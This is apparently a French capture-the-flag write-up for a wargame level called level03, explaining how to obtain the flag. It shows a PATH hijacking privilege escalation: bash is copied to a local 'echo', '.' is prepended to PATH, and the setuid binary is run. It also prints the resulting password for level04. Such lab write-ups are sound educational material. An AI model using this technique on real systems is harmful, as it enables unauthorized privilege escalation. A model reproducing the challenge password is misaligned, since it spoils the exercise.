# Pré requis

Télécharger peda sur la machine linux et récupérer le fichie `level03`

## GET Flag

echo "getflag" > Exploit
cp /bin/bash echo
export PATH=.:$PATH
./level03
``

# Flag

On peut executer ./level03 qui nous donne: `qi0maab88jeaj46qoumi7maus`

On peut se connecter sur le `level04`

```
level04
qi0maab88jeaj46qoumi7maus
```
